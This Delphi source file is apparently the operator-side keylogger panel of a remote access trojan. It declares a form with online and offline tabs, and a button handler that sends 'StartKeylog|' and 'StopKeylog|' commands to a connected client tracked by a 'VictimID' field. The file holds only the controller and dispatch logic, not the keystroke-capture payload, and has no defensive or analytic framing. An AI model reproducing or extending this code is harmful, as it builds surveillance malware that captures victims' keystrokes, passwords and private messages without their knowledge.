unit FrmKeylogger;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.StdCtrls;

type
  TForm20 = class(TForm)
    PageControl1: TPageControl;
    Online: TTabSheet;
    Offline: TTabSheet;
    StatusBar1: TStatusBar;
    StatusBar2: TStatusBar;
    Button1: TButton;
    Button2: TButton;
    Button3: TButton;
    OnlineMemo: TMemo;
    GroupBox1: TGroupBox;
    Edit1: TEdit;
    Button4: TButton;
    Button6: TButton;
    Button7: TButton;
    Memo2: TMemo;
    TreeView1: TTreeView;
    GroupBox2: TGroupBox;
    Edit2: TEdit;
    Button5: TButton;
    procedure Button1Click(Sender: TObject);
  private
    { Private declarations }
  public
    ThisFormsVictimID: string;
  end;

var
  Form20: TForm20;

implementation

{$R *.dfm}

uses FrmMain;

procedure SendToSelectedClient(const VictimID, Msg: string);
var
  I: Integer;
  NickName: string;
  UserData: TConnectedUserData;
begin
  NickName := VictimID;
  for I := 0 to Form1.ConnectedUsers.Count - 1 do
  begin
    UserData := TConnectedUserData(Form1.ConnectedUsers.Objects[I]);
    if UserData.ID = NickName then
    begin
      Form1.ServerSource.ExecCommand(UserData.Line, 0, BytesOf(Msg), False);
      Exit;
    end;
  end;
end;

procedure TForm20.Button1Click(Sender: TObject);
begin
  if Button1.Caption = 'Start' then
  begin
    SendToSelectedClient(ThisFormsVictimID, 'StartKeylog|');
    Button1.Caption := 'Stop';
  end
  else
  begin
    SendToSelectedClient(ThisFormsVictimID, 'StopKeylog|');
    Button1.Caption := 'Start';
  end;
end;

end.
